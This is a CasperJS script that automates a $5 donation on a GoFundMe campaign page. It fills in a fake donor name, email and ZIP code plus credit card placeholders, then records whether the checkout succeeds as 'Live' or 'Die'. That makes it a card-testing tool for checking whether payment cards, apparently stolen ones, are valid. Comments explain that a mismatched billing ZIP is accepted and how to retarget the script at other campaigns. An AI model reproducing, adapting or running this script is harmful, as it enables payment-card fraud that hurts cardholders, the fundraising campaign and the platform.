const fs = require('fs');

var utils = require('utils');
var casper = require('casper').create({
    verbose: false,
    logLevel: "debug",
    viewportSize: {
        width: 1920,
        height: 1080
    },

    pageSettings: {
        loadImages: true,//The script is much faster when this field is set to false
        loadPlugins: true,
        userAgent: 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36'
    }
});

//logStream.write(JSON.stringify(requestData));
casper.options.onResourceRequested = function(C, requestData, request) {
    //fs.write('request_1.json', JSON.stringify(requestData), 'a');
};
casper.options.onResourceReceived = function(C, response) {
    //console.log(JSON.stringify(response));
    /*fs.write("response.json", JSON.stringify(response), 'a');
    if (response.url == "https://www.gofundme.com/mvc.php?route=customcheckout/customCheckout") {
    	console.log(response.status);
    	if (response.status == null) {
    		fs.write("status.json", 'Live', 'w');
    	} else {
    		fs.write("status.json", 'Die', 'w');
    	}
    	casper.exit();
    }*/
};

//If you want to change the Campaign Link, please make sure that the new campaign has the same layout with
//https://www.gofundme.com/fundraising-for-ravi-teja/donate

casper.start().thenOpen("https://www.gofundme.com/fundraising-for-ravi-teja/donate", function() {
});

casper.then(function(){
    this.evaluate(function(){
    document.getElementById("input_amount").value="5"; //Charges amount, min $5
		document.getElementById("donate_firstname").value="Muhammad";
		document.getElementById("donate_lastname").value="Alfasih";
		document.getElementById("donate_email").value="x@alal.io";
		document.getElementById("donate_zip_selector").value="14224"; //Requires only valid US ZIP (bill != cc)
		document.getElementById("dd_country_hiddenvalue").value="US";
		document.getElementById("btn_enterdonate_continue").click();

		document.getElementsByName("billingCcNumber")[0].value = "INSERT_CREDIT_CARD_NUMBER_WITH_NO_SPACES";
		document.getElementsByName("billingCcMonth")[0].value = "INSERT_TWO_DIGIT_MONTH";
		document.getElementsByName("billingCcYear")[0].value = "INSERT_FOUR_DIGIT_MONTH";
		document.getElementsByName("billingCcCvv")[0].value = "INSERT_TWO_DIGIT_MONTH";
		document.getElementById("dd_billing_country_hiddenvalue").value = "US"; //Do not change the country
		document.getElementById("billing-address-zip-or-postcode").value = "14224"; //Requires only valid US ZIP (bill != cc)

		document.getElementById("btn_enterdonate_next").click();

		document.getElementById("btn-complete-receipt").click();
    });
});

casper.then(function() {
	casper.wait(6000);
	casper.on("resource.received", function(resource){
		if (resource.url == "https://www.gofundme.com/mvc.php?route=customcheckout/customCheckout") {
			if (resource.status == 400) {
				console.log('Die');
				fs.write("status.json", 'Die', 'w');
			} else {
				console.log('Live');
				fs.write("status.json", 'Live', 'w');
			}
		}
	});

});

casper.run();
